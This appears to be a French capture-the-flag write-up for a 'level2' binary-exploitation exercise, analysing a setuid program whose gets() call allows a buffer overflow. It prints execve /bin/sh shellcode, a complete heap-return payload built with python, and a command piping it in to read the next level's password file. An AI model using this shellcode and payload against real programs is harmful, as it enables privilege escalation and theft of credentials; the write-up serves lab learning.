## Comportement
- J'ai des droits `level2` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2*`
- En exécutant le binaire (`./level2`), on observe:
  - qu'il attend un input de notre part.
  - qu'il print notre input avant de quitter.
  - qu'il segfault `Segmentation fault (core dumped)` si l'input est trop long.

→ Peut-être un segfault à exploiter ?


## Analyse
En analysant le binaire (`gdb ./level2`) on observe:
- La présence d'une fonction `p()` avec un appel a `gets()`. Comme dans l'exercice precedent, la faille se trouve ici. 
  ```shell
  (gdb) disas p
  ...
  0x080484ed <+25>:	call   0x80483c0 <gets@plt>
  ...
  ```
- Une vérification est effectuée pour s'assurer que nous n'écrasons pas l'adresse de retour avec une adresse de la stack.
Notre adresse de retour ne peut pas commencer par le bit 'b' (indiqué par la commande 'and' avec la valeur "0xb0000000"). 
Elle ne peut donc pas pointer vers la stack (plage 0xbf000000 - 0xbfffffff).
  ```shell
  (gdb) disas p
  ...
  0x080484fb <+39>: and eax,0xb0000000
  0x08048500 <+44>: cmp eax,0xb0000000
  ...
  ```
- On constate que le buffer est ensuite copie via la fonction `strdup()`, or elle utilise `malloc()` qui stocke sur la heap et non la stack. 
  ``` 
  (gdb) disas p
  ...
  0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
  ...
  ```


## Résolution
- On applique un shellcode (petit code qui permet d'ouvrir un shell interactif) et l'inscrire sur la heap. 
Trouve [ici] (http://shell-storm.org/shellcode/files/shellcode-575.php). Il est de long de 21 bytes.
  ```shell
  \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
  ```
- On overwrite l'adresse de retour en utilisant un pattern generator comme [celui-ci] (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) afin de trouver l'offset de l'`eip`. On voit qu'il est de 80 bytes.
- On ajoute 59 bytes de padding (80 - 21) suivi de l'adresse du buffer dans la heap (`\x08\xb0\x04\x08`). Pour trouver celle ci on `run` le programme sous gdb en mettant un breakpoint apres `strdup()`, on observe l'etat du registre `eax` puisque `strdup()` y stocke l'adresse du buffer) : 
  ```shell
  python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xb0\x04\x08"' > /tmp/payload
  ```
- On couple l'envoi du payload avec le `cat` du password comme dans l'exercice precedent pour eviter que le shell ne se referme trop tot67.
  ```shell
  (cat /tmp/payload; echo "cat /home/user/level3/.pass") | ~/level2
  ```

Il ne reste plus qu'à :
- et passer au level3 (`su level3`) en renseignant le password obtenu plus haut.


